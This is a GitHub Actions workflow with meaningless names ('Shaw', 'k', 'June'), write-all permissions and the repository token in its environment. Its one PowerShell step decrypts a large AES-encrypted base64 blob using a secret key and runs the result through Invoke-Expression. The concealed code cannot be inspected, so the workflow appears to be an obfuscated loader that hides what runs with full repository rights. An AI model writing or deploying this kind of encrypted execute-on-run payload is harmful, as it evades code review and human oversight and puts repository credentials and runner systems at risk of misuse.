name: Shaw

on: 
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: ''
        type: string
      option2:
        required: false
        default: ''
        type: string
 
permissions: write-all

env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}
  OPTION_1: ${{ inputs.option1 }}
  OPTION_2: ${{ inputs.option2 }}

jobs:
  k:
    runs-on: windows-latest
    steps:
      - name: June
        shell: pwsh
        run: |
          $encrypted_payload = "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"
          $passphrase = $env:DECRYPTION_KEY

          $iterations = 10000
          $keySizeBytes = 32
          $ivSizeBytes = 16

          function Try-OpenSSLStyleDecrypt {
              param(
                  [byte[]]$ciphertextWithPossibleHeader,
                  [string]$password
              )

              try {
                  if (-not $password) {
                      throw "no supply"
                  }

                  # Check for OpenSSL 'Salted__' header (ASCII) -> first 8 bytes 'Salted__', next 8 bytes salt
                  $header = [System.Text.Encoding]::ASCII.GetString($ciphertextWithPossibleHeader, 0, [Math]::Min(8, $ciphertextWithPossibleHeader.Length))
                  if ($header -eq "Salted__") {
                      # extract salt (bytes 8..15) and ciphertext (from byte 16 onward)
                      $salt = [byte[]]($ciphertextWithPossibleHeader[8..15])
                      $cipherBytes = if ($ciphertextWithPossibleHeader.Length -gt 16) { [byte[]]($ciphertextWithPossibleHeader[16..($ciphertextWithPossibleHeader.Length - 1)]) } else { @() }
                  } else {
                      # no salt header found — assume the whole buffer is raw ciphertext, no salt
                      $salt = $null
                      $cipherBytes = $ciphertextWithPossibleHeader
                  }

                  # Derive key+iv using PBKDF2
                  $passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($password)

                  if ($salt -ne $null -and $salt.Length -gt 0) {
                      # Try to use SHA256-based Rfc2898DeriveBytes (requires .NET that supports HashAlgorithmName overload)
                      try {
                          $deriveCtor = [System.Security.Cryptography.Rfc2898DeriveBytes].GetConstructors() |
                                        Where-Object { $_.GetParameters().Length -ge 3 } |
                                        Select-Object -First 1
                          # Use explicit HashAlgorithmName if available (PowerShell Core / modern .NET)
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              ([System.Text.Encoding]::UTF8.GetString($passwordBytes)),
                              $salt,
                              $iterations,
                              [System.Security.Cryptography.HashAlgorithmName]::SHA256
                          )
                      } catch {
                          # Fallback to older constructor (uses HMACSHA1) — only do this if you know the data was derived with SHA1
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              $password,
                              $salt,
                              $iterations
                          )
                          Write-Warning "Rfc2898DeriveBytes SHA256 overload not available; falling back to default SHA1-based PBKDF2. If encryption used PBKDF2-SHA256, specify a PowerShell/.NET runtime that supports it."
                      }
                  } else {
                      # no salt -> cannot derive key reliably; try deriving with empty salt
                      $salt = ,0..7 | ForEach-Object { [byte]0 }
                      $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
                  }

                  $key = $rdb.GetBytes($keySizeBytes)
                  $iv  = $rdb.GetBytes($ivSizeBytes)

                  # Create AES decryptor
                  $aes = [System.Security.Cryptography.Aes]::Create()
                  $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                  $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                  $aes.KeySize = 256
                  $aes.Key = $key
                  $aes.IV = $iv

                  $transform = $aes.CreateDecryptor()
                  $ms = New-Object System.IO.MemoryStream (,$cipherBytes)
                  $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $transform, [System.Security.Cryptography.CryptoStreamMode]::Read)
                  $sr = New-Object System.IO.StreamReader($cs, [System.Text.Encoding]::UTF8)
                  $plaintext = $sr.ReadToEnd()

                  # clean up
                  $sr.Close(); $cs.Close(); $ms.Close(); $aes.Dispose()

                  return $plaintext
              } catch {
                  throw $_
              }
          }

          try {
              $cipherBytes = [Convert]::FromBase64String($encrypted_payload)

              $decrypted = Try-OpenSSLStyleDecrypt -ciphertextWithPossibleHeader $cipherBytes -password $passphrase

              if ($null -ne $decrypted -and $decrypted.Length -gt 0) {
                  Invoke-Expression $decrypted
              } else {
                  Write-Error "Decryption succeeded but produced empty output."
              }
          } catch {
              Write-Error "Decryption failed: $($_.Exception.Message)"
          }
